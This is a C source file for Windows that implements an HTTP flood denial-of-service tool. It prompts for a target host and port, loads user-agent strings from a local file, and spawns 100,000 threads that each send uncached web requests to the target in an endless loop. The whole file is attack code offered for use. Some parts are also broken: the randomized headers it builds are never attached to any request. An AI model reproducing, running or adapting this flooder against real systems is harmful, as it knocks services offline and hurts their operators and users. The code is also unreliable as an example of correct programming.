#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>
#include <time.h>

#define MAX_USER_AGENTS 100
#define BUFFER_SIZE 1024

typedef struct {
    char *url;
    int port;
    BOOL ssl;
    char user_agents[MAX_USER_AGENTS][BUFFER_SIZE];
    int user_agent_count;
} Requester;

void add_useragent(Requester *req) {
    char file_path[MAX_PATH];
    GetModuleFileName(NULL, file_path, MAX_PATH);
    char *last_slash = strrchr(file_path, '\\');
    if (last_slash != NULL) {
        *(last_slash + 1) = '\0';
        strcat(file_path, "bin\\qa.txt");
    }

    FILE *file = fopen(file_path, "r");
    if (file) {
        req->user_agent_count = 0;
        while (fgets(req->user_agents[req->user_agent_count], BUFFER_SIZE, file)) {
            char *newline = strchr(req->user_agents[req->user_agent_count], '\n');
            if (newline) *newline = '\0';
            req->user_agent_count++;
            if (req->user_agent_count >= MAX_USER_AGENTS) break;
        }
        fclose(file);
    } else {
        printf("File %s not found.\n", file_path);
    }
}

char *random_user_agent(Requester *req) {
    if (req->user_agent_count == 0) return NULL;
    int index = rand() % req->user_agent_count;
    return req->user_agents[index];
}

void set_request_headers(HINTERNET hConnect, Requester *req) {
    char user_agent[BUFFER_SIZE];
    snprintf(user_agent, BUFFER_SIZE, "User-Agent: %s\r\n", random_user_agent(req));
    char cache_control[BUFFER_SIZE];
    snprintf(cache_control, BUFFER_SIZE, "Cache-Control: no-cache\r\n");
    
    char headers[BUFFER_SIZE];
    snprintf(headers, BUFFER_SIZE, "%s%s", user_agent, cache_control);
    
    DWORD timeout = 60000;
    if (!InternetSetOption(hConnect, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout))) {
        printf("Failed to set receive timeout: %ld\n", GetLastError());
    }
    if (!InternetSetOption(hConnect, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout))) {
        printf("Failed to set send timeout: %ld\n", GetLastError());
    }
}

void send_request(Requester *req) {
    HINTERNET hInternet = InternetOpen(TEXT("HTTP Agent"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
        if (req->ssl) {
            flags |= INTERNET_FLAG_SECURE;
        }
        
        char url[BUFFER_SIZE];
        snprintf(url, BUFFER_SIZE, "%s://%s:%d", req->ssl ? "https" : "http", req->url, req->port);

        HINTERNET hConnect = InternetOpenUrl(hInternet, url, NULL, 0, flags, 0);
        if (hConnect) {
            set_request_headers(hConnect, req);
            
            char buffer[BUFFER_SIZE];
            DWORD bytes_read;
            while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytes_read) && bytes_read > 0) {
                buffer[bytes_read] = '\0';
            }
            
            InternetCloseHandle(hConnect);
        } else {
            printf("Failed to connect to %s: %ld\n", url, GetLastError());
        }
        InternetCloseHandle(hInternet);
    } else {
        printf("Failed to open internet connection: %ld\n", GetLastError());
    }
}

DWORD WINAPI thread_func(LPVOID param) {
    Requester *req = (Requester *)param;
    while (1) {
        send_request(req);
    }
    return 0;
}

int main() {
    srand((unsigned int)time(NULL));
    
    Requester req;
    req.url = malloc(BUFFER_SIZE);
    if (req.url == NULL) {
        printf("Memory allocation failed.\n");
        return 1;
    }
    req.port = 80;
    req.ssl = FALSE;
    req.user_agent_count = 0;

    add_useragent(&req);

    printf("Enter the URL or IP address: ");
    if (fgets(req.url, BUFFER_SIZE, stdin) == NULL) {
        printf("Failed to read URL input.\n");
        free(req.url);
        return 1;
    }
    req.url[strcspn(req.url, "\n")] = '\0';

    printf("Enter the port number (e.g., 80): ");
    if (scanf("%d", &req.port) != 1) {
        printf("Failed to read port number.\n");
        free(req.url);
        return 1;
    }
    getchar();

    if (req.port == 443) {
        req.ssl = TRUE;
    }

    const int num_threads = 100000;
    HANDLE threads[num_threads];
    for (int i = 0; i < num_threads; i++) {
        threads[i] = CreateThread(NULL, 0, thread_func, &req, 0, NULL);
        if (threads[i]) {
            printf("Thread %d created successfully.\n", i);
        } else {
            printf("Failed to create thread %d: %ld\n", i, GetLastError());
        }
    }

    WaitForMultipleObjects(num_threads, threads, TRUE, INFINITE);

    for (int i = 0; i < num_threads; i++) {
        CloseHandle(threads[i]);
    }

    free(req.url);
    return 0;
}